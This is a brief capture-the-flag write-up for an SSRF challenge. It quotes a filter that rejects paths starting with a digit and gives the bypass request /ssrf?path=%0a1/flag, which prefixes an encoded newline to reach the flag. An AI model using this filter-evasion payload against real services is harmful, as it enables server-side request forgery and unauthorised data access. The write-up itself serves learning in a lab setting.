This is litterallt the same as SSRF 101, With one diffrence which is : filtering!

Whta we should bypass is this part of the code :

```
 	const normalizedPath = path.normalize('NFKC')
        const firstPathChar = normalizedPath.charAt(0)
        
	if ('0' <= firstPathChar && firstPathChar <= '9') {
            res.send('first chararacter of path must not normalize to a digit')
        }
```

so calling /ssrf?path=1/flag , as we did before in SSRF 101 won't work since 1 is number!
hm , normalize ? NFKC ? well well i smell a \n !!!

calling ssrf?path=%0a1/flag  did the trick and we got our flag.
